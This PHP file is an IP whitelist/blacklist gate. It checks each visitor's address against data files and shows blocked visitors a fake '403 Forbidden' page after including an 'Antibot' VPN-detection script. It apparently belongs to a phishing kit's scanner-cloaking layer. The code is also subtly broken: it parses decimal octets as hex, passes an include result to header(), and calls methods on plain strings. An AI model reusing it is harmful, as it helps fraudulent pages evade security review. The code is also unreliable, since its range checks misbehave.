<?php


$ips = array($_SERVER['REMOTE_ADDR'],);
date_default_timezone_set("Asia/Jakarta");
$checklist = new IpBlockList( );
$random_id = sha1(rand(0,1000000));
foreach ($ips as $ip ) {
$result = $checklist->ipPass( $ip );
if (!$result) {
$msg = "FAILED: ".$checklist->message();
$ip = getenv("REMOTE_ADDR");
header(require 'Antibot/AntibotVirtualprivatenetwork.php');
die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
exit();
}
}
class IpList {
private $iplist = array();
private $ipfile = "";
public function __construct( $list ) {
$contents = array();
$this->ipfile = $list;
$lines = $this->read( $list );
foreach( $lines as $line ) {
$line = trim( $line );
if ( empty($line ) ) {
continue;
}
if ( $line[0] == '#') {
continue;
}
$temp = explode( "#",$line );
$line = trim( $temp[0] );
$contents[] = $this->normal($line);
}
$this->iplist = $contents;
}
public function __destruct() {
}
public function __toString() {
return implode(' ',$this->iplist);
}
public function is_inlist( $ip ) {
$retval = false;
foreach( $this->iplist as $ipf ) {
$retval = $this->ip_in_range( $ip,$ipf );
if ($retval === true ) {
$this->range = $ipf;
break;
}
}
return $retval;
}
public function iplist() {
return $this->iplist;
}
public function message() {
return $this->range;
}
public function append( $ip,$comment ) {
return file_put_contents( $this->ipfile,$ip,$comment );
}
public function listname() {
return $this->ipfile;
}
private function read( $fname ) {
try {
$file = file( $fname,FILE_IGNORE_NEW_LINES |FILE_SKIP_EMPTY_LINES  );
}
catch( Exception $e ) {
throw new Exception( $fname.': '.$e->getmessage() .'
');
}
return $file;
}
private function ip_in_range( $ip,$range ) {
if ( strpos($range,'/') !== false ) {
list( $range,$netmask ) = explode( '/',$range,2 );
if ( strpos( $netmask,'.') !== false ) {
$netmask = str_replace('*','0',$netmask );
$dnetmask = ip2long( $netmask );
return ((ip2long( $ip ) &$dnetmask) == (ip2long($range) &$dnetmask ));
}
else {
$r = explode( '.',$range );
while( count( $r ) <4 ) {
$r[] = '0';
}
for($i = 0;$i <4;$i++) {
$r[$i] = empty($r[$i]) ?'0': $r[$i];
}
$range = implode( '.',$r );
$dnetmask = ~(pow( 2,( 32 -$netmask)) -1);
return ((ip2long($ip) &$dnetmask)==(ip2long($range) &$dnetmask));
}
}
else {
if ( strpos( $range,'*') !== false ) {
$low = str_replace( '*','0',$range );
$high = str_replace( '*','255',$range );
$range = $low.'-'.$high;
}
if ( strpos( $range,'-') !== false ) {
list( $low,$high ) = explode( '-',$range,2 );
$dlow  = $this->toLongs( $low );
$dhigh = $this->toLongs( $high );
$dip   = $this->toLongs( $ip );
return (($this->compare($dip,$dlow) != -1) &&($this->compare($dip,$dhigh) != 1));
}
}
return ( $ip == $range );
}
private function normal( $range ) {
if ( strpbrk( "*-/",$range ) === False ) {
$range .= "/32";
}
return str_replace( ' ','',$range );
}
private function toLongs( $ip ) {
$Parts = explode('.',$ip );
$Ip = array('','');
for ($i = 0;$i <2;$i++){
$Ip[0] .= str_pad(base_convert($Parts[$i],16,2),16,0,STR_PAD_LEFT);
}
for ($i = 2;$i <4;$i++) {
$Ip[1] .= str_pad(base_convert($Parts[$i],16,2),16,0,STR_PAD_LEFT);
}
return array(base_convert($Ip[0],2,10),base_convert($Ip[1],2,10));
}
private function compare( $ipdec1,$ipdec2 ) {
if( $ipdec1[0] <$ipdec2[0] ) {
return -1;
}
elseif ( $ipdec1[0] >$ipdec2[0] ) {
return 1;
}
elseif ( $ipdec1[1] <$ipdec2[1] ) {
return -1;
}
elseif ( $ipdec1[1] >$ipdec2[1] ) {
return 1;
}
return 0;
}
}
class IpBlockList {
private $statusid = array( 'negative'=>-1,'neutral'=>0,'positive'=>1 );
private $whitelist = array();
private $blacklist = array();
private $message   = NULL;
private $status    = NULL;
public function __construct( $whitelistfile = './security/whitelist.dat',
$blacklistfile = './security/blacklist.dat') {
$this->whitelistfile = $whitelistfile;
$this->blacklistfile = $blacklistfile;
$this->whitelist = new IpList( $whitelistfile );
$this->blacklist = new IpList( $blacklistfile );
}
public  function    __destruct() {
}
public function ipPass( $ip ) {
$retval = False;
if ( !filter_var( $ip,FILTER_VALIDATE_IP,FILTER_FLAG_IPV4 ) ) {
throw new Exception( 'Requires valid IPv4 address');
}
if ( $this->whitelist->is_inlist( $ip ) ) {
$retval = True;
$this->message = $ip ." is whitelisted by ".$this->whitelist->message().".";
$this->status = $this->statusid['positive'];
}
else if ( $this->blacklist->is_inlist( $ip ) ) {
$retval = False;
$this->message = $ip ." is blacklisted by ".$this->blacklist->message().".";
$this->status = $this->statusid['negative'];
}
else {
$retval = True;
$this->message = $ip ." is unlisted.";
$this->status = $this->statusid['neutral'];
}
return $retval;
}
public function message() {
return $this->message;
}
public function status() {
return $this->status;
}
public function append( $type,$ip,$comment = "") {
if ($type == 'WHITELIST') {
$retval = $this->whitelistfile->append( $ip,$comment );
}
elseif( $type == 'BLACKLIST') {
$retval = $this->blacklistfile->append( $ip,$comment );
}
else {
$retval = false;
}
}
public function filename( $type,$ip,$comment = "") {
if ($type == 'WHITELIST') {
$retval = $this->whitelistfile->filename( $ip,$comment );
}
elseif( $type == 'BLACKLIST') {
$retval = $this->blacklistfile->filename( $ip,$comment );
}
else {
$retval = false;
}
}
}
;